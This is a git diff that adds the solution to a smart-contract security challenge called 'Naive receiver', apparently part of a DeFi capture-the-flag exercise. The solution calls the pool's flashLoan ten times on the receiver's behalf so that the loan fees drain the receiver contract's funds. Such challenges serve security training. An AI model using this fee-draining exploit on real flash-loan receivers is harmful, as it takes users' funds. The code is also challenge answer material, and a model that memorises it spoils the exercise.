@@ -38,6 +38,16 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
+        await pool.connect(player).flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', ethers.utils.parseUnits("1", 18), ethers.utils.toUtf8Bytes("Some data"))
     });
 
     after(async function () {
